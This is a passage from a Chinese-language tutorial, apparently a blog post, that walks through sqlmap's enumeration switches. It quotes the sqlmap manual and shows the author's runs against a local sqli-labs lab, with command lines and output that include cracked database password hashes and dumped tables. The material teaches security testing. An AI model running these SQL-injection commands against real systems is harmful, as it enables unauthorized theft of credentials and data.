<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; <span class="comment">--\passwords -v 1</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">back<span class="operator">-</span><span class="keyword">end</span> DBMS: PostgreSQL</span><br><span class="line">[hh:mm:<span class="number">38</span>] [INFO] fetching database users password hashes</span><br><span class="line">do you want <span class="keyword">to</span> use dictionary attack <span class="keyword">on</span> retrieved password hashes? [Y<span class="operator">/</span>n<span class="operator">/</span>q] y</span><br><span class="line">[hh:mm:<span class="number">42</span>] [INFO] <span class="keyword">using</span> hash <span class="keyword">method</span>: <span class="string">&#x27;postgres_passwd&#x27;</span></span><br><span class="line">what<span class="string">&#x27;s the dictionary&#x27;</span>s location? [<span class="operator">/</span>software<span class="operator">/</span>sqlmap<span class="operator">/</span>txt<span class="operator">/</span>wordlist.txt]</span><br><span class="line">[hh:mm:<span class="number">46</span>] [INFO] loading dictionary <span class="keyword">from</span>: <span class="string">&#x27;/software/sqlmap/txt/wordlist.txt&#x27;</span></span><br><span class="line">do you want <span class="keyword">to</span> use common password suffixes? (slow<span class="operator">!</span>) [y<span class="operator">/</span>N] n</span><br><span class="line">[hh:mm:<span class="number">48</span>] [INFO] starting dictionary attack (postgres_passwd)</span><br><span class="line">[hh:mm:<span class="number">49</span>] [INFO] found: <span class="string">&#x27;testpass&#x27;</span> <span class="keyword">for</span> <span class="keyword">user</span>: <span class="string">&#x27;testuser&#x27;</span></span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] found: <span class="string">&#x27;testpass&#x27;</span> <span class="keyword">for</span> <span class="keyword">user</span>: <span class="string">&#x27;postgres&#x27;</span></span><br><span class="line">database management <span class="keyword">system</span> users password hashes:</span><br><span class="line">[<span class="operator">*</span>] postgres [<span class="number">1</span>]:    </span><br><span class="line">	password hash: md5d7d880f96044b72d0bba108ace96d1e4    </span><br><span class="line">	clear<span class="operator">-</span>text password: testpass</span><br><span class="line">[<span class="operator">*</span>] testuser [<span class="number">1</span>]:    </span><br><span class="line">	password hash: md599e5ea7a6f7c3269995cba3927fd0093   </span><br><span class="line">	clear<span class="operator">-</span>text password: testpass</span><br></pre></td></tr></table></figure>

<p>以上例子中，sqlmap 不仅枚举了 DBMS 用户及其密码，而且识别出密码哈希格式属于PostgreSQL，并询问用户是否使用字典文件进行散列测试，并识别出了用户 <code>postgres</code> 的明文密码，它通常是 DBA，被识别出的还有用户 <code>testuser</code> 的密码。</p>
<p>对于可以枚举用户密码哈希的 DBMS 都已实现了此功能，包括 Oracle 和 Microsoft SQL Server 2005 及后续版本。</p>
<p>你还可以使用 <code>-U</code> 选项来指定要枚举的特定用户，并破解其对应密码哈希。如果你提供 <code>CU</code> 作为用户名，它会将其视为当前用户的别名，并将获取此用户的密码哈希值。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--passwords</span></span><br><span class="line"></span><br><span class="line">do you want <span class="keyword">to</span> store hashes <span class="keyword">to</span> a temporary file <span class="keyword">for</span> eventual further processing <span class="keyword">with</span> other tools [y<span class="operator">/</span>N] y</span><br><span class="line">do you want <span class="keyword">to</span> perform a dictionary<span class="operator">-</span>based attack against retrieved password hashes? [Y<span class="operator">/</span>n<span class="operator">/</span>q] n</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502212257704.png"
                      alt="image-20210502212257704"
                ></p>
<p>使用<code>-U</code>来指定用户，便只输出指定用户</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>U BEACON <span class="comment">--passwords</span></span><br><span class="line"></span><br><span class="line">do you want <span class="keyword">to</span> store hashes <span class="keyword">to</span> a temporary file <span class="keyword">for</span> eventual further processing <span class="keyword">with</span> other tools [y<span class="operator">/</span>N] y</span><br><span class="line">do you want <span class="keyword">to</span> perform a dictionary<span class="operator">-</span>based attack against retrieved password hashes? [Y<span class="operator">/</span>n<span class="operator">/</span>q] n</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502212601561.png"
                      alt="image-20210502212601561"
                ></p>
<h3 id="列出-DBMS-所有用户权限"><a href="#列出-DBMS-所有用户权限" class="headerlink" title="列出 DBMS 所有用户权限"></a>列出 DBMS 所有用户权限</h3><blockquote>
<p>开关：<code>--privileges</code></p>
<p>如果当前会话用户对包含 DBMS 用户信息的系统表有读取权限，则可以枚举出每个 DBMS 用户的权限。根据权限信息，sqlmap 还将显示出哪些是数据库管理员。</p>
<p>你还可以使用 <code>-U</code> 选项来指定要枚举出权限的用户。</p>
<p>如果你提供 <code>CU</code> 作为用户名，它会将其视为当前用户的别名，并将获取此用户的权限信息。</p>
<p>在 Microsoft SQL Server 中，此功能将显示每个用户是否为数据库管理员，而不是所有用户的权限列表。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--privileges</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502213100773.png"
                      alt="image-20210502213100773"
                ></p>
<h3 id="列出-DBMS-所有用户角色"><a href="#列出-DBMS-所有用户角色" class="headerlink" title="列出 DBMS 所有用户角色"></a>列出 DBMS 所有用户角色</h3><blockquote>
<p>开关：<code>--roles</code></p>
<p>如果当前会话用户对包含 DBMS 用户信息的系统表有读取权限，则可以枚举出每个 DBMS 用户的角色。</p>
<p>你还可以使用 <code>-U</code> 选项来指定要枚举出角色的用户。</p>
<p>如果你提供 <code>CU</code> 作为用户名，它会将其视为当前用户的别名，并将获取此用户的角色信息。</p>
<p>此功能仅在 DBMS 为 Oracle 时可用。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--roles</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502213234254.png"
                      alt="image-20210502213234254"
                ></p>
<h3 id="列出-DBMS-所有数据库"><a href="#列出-DBMS-所有数据库" class="headerlink" title="列出 DBMS 所有数据库"></a>列出 DBMS 所有数据库</h3><blockquote>
<p>开关：<code>--dbs</code></p>
<p>如果当前会话用户对包含 DBMS 可用数据库信息的系统表有读取权限，则可以枚举出当前数据库列表。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502213505074.png"
                      alt="image-20210502213505074"
                ></p>
<h3 id="枚举数据表"><a href="#枚举数据表" class="headerlink" title="枚举数据表"></a>枚举数据表</h3><blockquote>
<p>开关和选项：<code>--tables</code>，<code>--exclude-sysdbs</code> 和 <code>-D</code></p>
<p>如果当前会话用户对包含 DBMS 数据表信息的系统表有读取权限，则可以枚举出特定 DBMS 的数据表。</p>
<p>如果你不使用选项 <code>-D</code> 来指定数据库，则 sqlmap 将枚举所有 DBMS 数据库的表。</p>
<p>你还可以提供开关 <code>--exclude-sysdbs</code> 以排除所有的系统数据库。</p>
<p>注意，对于 Oracle，你需要提供 <code>TABLESPACE_NAME</code> 而不是数据库名称。</p>
</blockquote>
<p>单纯使用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>

<p>使得所有数据表都被枚举，无法准确得到我们想要的数据表，故于可此使用<code>-D</code>来指定数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D security <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502214029820.png"
                      alt="image-20210502214029820"
                ></p>
<p><code>--exclude-sysdbs</code>用于排除所有系统数据库</p>
<h3 id="枚举数据表的列名"><a href="#枚举数据表的列名" class="headerlink" title="枚举数据表的列名"></a>枚举数据表的列名</h3><blockquote>
<p>开关和选项：<code>--columns</code>，<code>-C</code>，<code>-T</code> 和 <code>-D</code></p>
<p>如果当前会话用户对包含 DBMS 数据表信息的系统表有读取权限，则可以枚举出特定数据表的列名。sqlmap 还将枚举所有列的数据类型。</p>
<p>此功能可使用选项 <code>-T</code> 来指定表名，还可以使用选项 <code>-D</code> 来指定数据库名称。如果未指定数据库名称，将使用当前的数据库名称。你还可以使用选项 <code>-C</code> 来指定要枚举的表列名。</p>
<p>针对 SQLite 目标的示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1&quot; <span class="operator">-</span>\</span><br><span class="line"><span class="operator">-</span>columns <span class="operator">-</span>D testdb <span class="operator">-</span>T users <span class="operator">-</span>C name</span><br><span class="line">[...]</span><br><span class="line">Database: SQLite_masterdb</span><br><span class="line"><span class="keyword">Table</span>: users</span><br><span class="line">[<span class="number">3</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>  <span class="operator">|</span> Type    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------+</span></span><br><span class="line"><span class="operator">|</span> id      <span class="operator">|</span> <span class="type">INTEGER</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> name    <span class="operator">|</span> TEXT    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> surname <span class="operator">|</span> TEXT    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------+</span></span><br></pre></td></tr></table></figure>

<p>注意，对于 PostgreSQL，你需要提供 <code>public</code> 或系统数据库的名称。这是因为不可能枚举其他数据库表，只能枚举出 Web 应用程序用户连接到的数据库模式下的表，它们总是以 <code>public</code> 为别名。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D security <span class="operator">-</span>T users <span class="comment">--columns</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502214612892.png"
                      alt="image-20210502214612892"
                ></p>
<h3 id="枚举-DBMS-模式"><a href="#枚举-DBMS-模式" class="headerlink" title="枚举 DBMS 模式"></a>枚举 DBMS 模式</h3><blockquote>
<p>开关：<code>--schema</code> 和 <code>--exclude-sysdbs</code></p>
<p>用户可以使用此开关获取 DBMS 模式。模式列表将包含所有数据库、表和列以及它们各自的类型。结合 <code>--exclude-sysdbs</code>，只有包含非系统数据库的模式才会被获取并显示出来。</p>
<p>针对 MySQL 目标的示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.48.130/sqlmap/mysql/get_int.php?id=1&quot; <span class="comment">--s\chema--batch --exclude-sysdbs</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line"><span class="keyword">Table</span>: accounts</span><br><span class="line">[<span class="number">4</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>      <span class="operator">|</span> Type    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+---------+</span></span><br><span class="line"><span class="operator">|</span> cid         <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysignature <span class="operator">|</span> text    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> password    <span class="operator">|</span> text    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> username    <span class="operator">|</span> text    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+---------+</span></span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line"><span class="keyword">Table</span>: blogs_table</span><br><span class="line">[<span class="number">4</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>       <span class="operator">|</span> Type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="type">date</span>         <span class="operator">|</span> datetime <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> blogger_name <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cid          <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> comment      <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+----------+</span></span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line"><span class="keyword">Table</span>: hitlog</span><br><span class="line">[<span class="number">6</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>   <span class="operator">|</span> Type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="type">date</span>     <span class="operator">|</span> datetime <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> browser  <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cid      <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> hostname <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ip       <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> referer  <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"></span><br><span class="line">Database: testdb</span><br><span class="line"><span class="keyword">Table</span>: users</span><br><span class="line">[<span class="number">3</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>  <span class="operator">|</span> Type          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------------+</span></span><br><span class="line"><span class="operator">|</span> id      <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> name    <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">500</span>)  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> surname <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">1000</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------------+</span></span><br><span class="line"></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--schema --batch --exclude-sysdbs</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502215229748.png"
                      alt="image-20210502215229748"
                ></p>
<h3 id="获取数据表的数据条目数"><a href="#获取数据表的数据条目数" class="headerlink" title="获取数据表的数据条目数"></a>获取数据表的数据条目数</h3><blockquote>
<p>开关：<code>--count</code></p>
<p>如果用户想要在导出所需表数据之前知道表中的条目数，可以使用此开关。</p>
<p>针对 Microsoft SQL Server 目标的示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;\</span><br><span class="line"> <span class="comment">--count -D testdb</span></span><br><span class="line">[...]</span><br><span class="line">Database: testdb</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Table</span>          <span class="operator">|</span> Entries <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+---------+</span></span><br><span class="line"><span class="operator">|</span> dbo.users      <span class="operator">|</span> <span class="number">4</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> dbo.users_blob <span class="operator">|</span> <span class="number">2</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+---------+</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--count -D security</span></span><br></pre></td></tr></table></figure>

<p>这里指定了数据库为”security”</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502215533633.png"
                      alt="image-20210502215533633"
                ></p>
<h3 id="导出数据表条目"><a href="#导出数据表条目" class="headerlink" title="导出数据表条目"></a>导出数据表条目</h3><blockquote>
<p>开关和选项：<code>--dump</code>，<code>-C</code>，<code>-T</code>，<code>-D</code>，<code>--start</code>，<code>--stop</code>，<code>--first</code>，<code>--last</code>，<code>--pivot-column</code> 和 <code>--where</code></p>
<p>如果当前会话用户对特定的数据表有读取权限，则可以导出数据表条目。</p>
<p>此功能依赖选项 <code>-T</code> 来指定表名，还可以用选项 <code>-D</code> 来指定数据库名称。如果提供了表名而不提供数据库名，则会使用当前的数据库。</p>
<p>针对 Firebird 目标的示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/firebird/get_int.php?id=1&quot;\</span><br><span class="line"> <span class="comment">--dump -T users</span></span><br><span class="line">[...]</span><br><span class="line">Database: Firebird_masterdb</span><br><span class="line"><span class="keyword">Table</span>: USERS</span><br><span class="line">[<span class="number">4</span> entries]</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+------------+</span></span><br><span class="line"><span class="operator">|</span> ID <span class="operator">|</span> NAME   <span class="operator">|</span> SURNAME    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>  <span class="operator">|</span> luther <span class="operator">|</span> blisset    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>  <span class="operator">|</span> fluffy <span class="operator">|</span> bunny      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>  <span class="operator">|</span> wu     <span class="operator">|</span> ming       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4</span>  <span class="operator">|</span> <span class="keyword">NULL</span>   <span class="operator">|</span> nameisnull <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+------------+</span></span><br></pre></td></tr></table></figure>

<p>此开关也可用于导出指定数据库数据表的所有条目。你只需要提供开关 <code>--dump</code> 和选项 <code>-D</code>（不提供 <code>-T</code> 和 <code>-C</code>）。</p>
<p>你还可以使用选项 <code>-C</code> 提供一个以逗号分隔的特定列名列表来导出数据。</p>
<p>sqlmap 还能会为每个表生成相应的 CSV 格式文本文件用于存储导出的数据。你可以通过提供大于或等于 <strong>1</strong> 的详细程度级别来查看 sqlmap 所创建文件的绝对路径。</p>
<p>如果只是想导出特定范围的条目，可以提供选项 <code>--start</code> 和/或 <code>--stop</code>，以指定要从哪条数据开始导出和在哪条数据停止。例如，如果仅导出第一个条目，就在命令行中提供 <code>--stop 1</code>。或者如果你只想导出第二和第三个条目，就提供 <code>--start 1</code> <code>--stop 3</code>。</p>
<p>还可以使用选项 <code>--first</code> 和 <code>--last</code> 指定要导出的单个字符或特定范围的字符。例如，如果要导出条目的第三到第五个字符，就提供 <code>--first 3</code> <code>--last 5</code>。此功能仅适用于盲注技术，因为报错型注入（Error-based）和联合查询注入（UNION query-based）技术不管列数据条目的长度如何，发起的请求数量是完全相同的。</p>
<p>有些情况下（例如：对于 Microsoft SQL Server，Sybase 和 SAP MaxDB），由于缺少类似的机制，无法使用 <code>OFFSET m, n</code> 直接导出表的数据。在这种情况下，sqlmap 通过确定最适合的 <code>pivot</code> 列（具有唯一值的列，一般是主键），并使用该列检索其他列值，以此来导出数据。如果因为自动选择的 <code>pivot</code> 列不适用（例如：由于缺少表导出结果）而需要强制使用特定列，你可以使用选项 <code>--pivot-column</code>（例如： <code>--pivot-column=id</code>）。</p>
<p>如果要约束导出特定的列值（或范围），可以使用选项 <code>--where</code>。提供的逻辑运算将自动在 <code>WHERE</code> 子句内使用。例如，如果使用 <code>--where=&quot;id&gt;3&quot;</code>，那么只有 <code>id</code> 值大于 3 的行会被获取（通过将 <code>WHERE id&gt;3</code> 附加到使用的查询语句中）。</p>
<p>正如你可能已经注意到的，sqlmap 非常<strong>灵活</strong>：你可以将让其自动导出整个数据库表，或者非常精确地导出特定字符、列和范围的条目。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D security <span class="operator">-</span>T users <span class="operator">-</span>C password,username <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502220016913.png"
                      alt="image-20210502220016913"
                ></p>
<p><code>--dump</code>导出了数据库该数据表下所有条目</p>
<p><code>--start</code>或<code>--stop</code>用于控制输出的条目</p>
<p>​    <code>--stop 1</code>仅导出第一个条目</p>
<p>​    <code>--start 1 --stop 3</code>仅导出第二、第三个条目</p>
<p><code>--first 3 --last 5</code>导出条目的第三到第五个字符</p>
<h3 id="导出所有数据表条目"><a href="#导出所有数据表条目" class="headerlink" title="导出所有数据表条目"></a>导出所有数据表条目</h3><blockquote>
<p>开关：<code>--dump-all</code> 和 <code>--exclude-sysdbs</code></p>
<p>如果当前会话用户的读取权限允许，可以一次导出所有数据库表条目。</p>
<p>你还可以提供开关 <code>--exclude-sysdbs</code> 以排除所有的系统数据库。在这种情况下，sqlmap 只会导出当前用户的数据库表条目。</p>
<p>注意，对于 Microsoft SQL Server，<code>master</code> 数据库不被视为系统数据库，因为某些数据库管理员将其用作用户数据库。</p>
</blockquote>
<h3 id="搜索列，表或数据库"><a href="#搜索列，表或数据库" class="headerlink" title="搜索列，表或数据库"></a>搜索列，表或数据库</h3><blockquote>
<p>开关和选项：<code>--search</code>，<code>-C</code>，<code>-T</code>，<code>-D</code></p>
<p>此开关允许你<strong>在所有数据库中搜索特定的数据库名和表名，在特定的数据表中搜索特定的列名</strong>。</p>
<p>这非常有用，例如，要识别包含应用程序凭据的表，其中相关列的名称包含诸如 <em>name</em> 和 <em>pass</em> 这样的字符串。</p>
<p>开关 <code>--search</code> 需要与以下支持选项一起使用：</p>
<ul>
<li><code>-C</code>，附带以逗号分隔的列名列表来搜索整个 DBMS。</li>
<li><code>-T</code>，附带以逗号分隔的表名列表来搜索整个 DBMS。</li>
<li><code>-D</code>，附带以逗号分隔的数据库名列表来搜索整个 DBMS。</li>
</ul>
</blockquote>
<h3 id="运行自定义-SQL-语句"><a href="#运行自定义-SQL-语句" class="headerlink" title="运行自定义 SQL 语句"></a>运行自定义 SQL 语句</h3><blockquote>
<p>选项和开关：<code>--sql-query</code> 和 <code>--sql-shell</code></p>
<p>SQL 查询和 SQL shell 功能允许在 DBMS 上运行任意 SQL 语句。sqlmap 会自动解析提供的语句，确定哪种技术适合用于注入它，以及如何打包相应的 SQL payload。</p>
<p>如果查询是 <code>SELECT</code> 语句，sqlmap 将获取其输出。否则，如果 Web 应用程序的后端 DBMS 支持多语句，它将通过堆叠查询注入（Stacked queries）技术执行查询。注意，某些 Web 应用程序技术不支持特定 DBMS 上的堆叠查询。例如，当后端 DBMS 是 MySQL 时，PHP 不支持堆叠查询，但是当后端 DBMS 是 PostgreSQL 时，它是支持的。</p>
<p>针对 Microsoft SQL Server 2000 目标的示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; <span class="comment">--\</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>query &quot;SELECT &#x27;foo&#x27;&quot; <span class="operator">-</span>v <span class="number">1</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:<span class="number">14</span>] [INFO] fetching <span class="keyword">SQL</span> <span class="keyword">SELECT</span> query output: <span class="string">&#x27;SELECT &#x27;</span>foo<span class="string">&#x27;&#x27;</span></span><br><span class="line">[hh:mm:<span class="number">14</span>] [INFO] retrieved: foo</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;foo&#x27;</span>:    <span class="string">&#x27;foo&#x27;</span></span><br><span class="line"></span><br><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; <span class="comment">--\</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>query &quot;SELECT &#x27;foo&#x27;，&#x27;bar&#x27;&quot; <span class="operator">-</span>v <span class="number">2</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] fetching <span class="keyword">SQL</span> <span class="keyword">SELECT</span> query output: <span class="string">&#x27;SELECT &#x27;</span>foo<span class="string">&#x27;, &#x27;</span>bar<span class="string">&#x27;&#x27;</span></span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] the <span class="keyword">SQL</span> query provided has more than a field. sqlmap will now</span><br><span class="line">unpack it <span class="keyword">into</span> <span class="keyword">distinct</span> queries <span class="keyword">to</span> be able <span class="keyword">to</span> retrieve the output even if we <span class="keyword">are</span></span><br><span class="line"> going blind</span><br><span class="line">[hh:mm:<span class="number">50</span>] [DEBUG] query: <span class="keyword">SELECT</span> ISNULL(<span class="built_in">CAST</span>((<span class="type">CHAR</span>(<span class="number">102</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">111</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">111</span>)) <span class="keyword">AS</span></span><br><span class="line"><span class="type">VARCHAR</span>(<span class="number">8000</span>)), (<span class="type">CHAR</span>(<span class="number">32</span>)))</span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] retrieved: foo</span><br><span class="line">[hh:mm:<span class="number">50</span>] [DEBUG] performed <span class="number">27</span> queries <span class="keyword">in</span> <span class="number">0</span> seconds</span><br><span class="line">[hh:mm:<span class="number">50</span>] [DEBUG] query: <span class="keyword">SELECT</span> ISNULL(<span 